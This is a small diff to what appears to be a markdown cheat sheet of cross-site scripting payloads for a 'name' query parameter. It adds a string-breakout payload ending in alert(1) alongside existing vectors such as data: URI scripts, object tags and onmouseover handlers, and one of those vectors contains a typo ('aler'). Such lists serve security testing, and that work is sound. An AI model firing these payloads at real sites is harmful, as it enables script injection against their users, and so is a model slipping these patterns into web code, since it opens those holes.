@@ -18,7 +18,7 @@
 - __`/?name=<object data="data:text/javascript,<h1>test123"></object>`__
 - __`/?name=<script src=data:text/javascript,alert(1337)></script>`__
 - __`/?name="><h1><u/onmouseover=alert(1)>test123`__
-
+- __`/?name=test123';alert(1);//`__
 #### for "input" tag
 - __`/?name=test123" onmouseover=aler(1);//`__
 
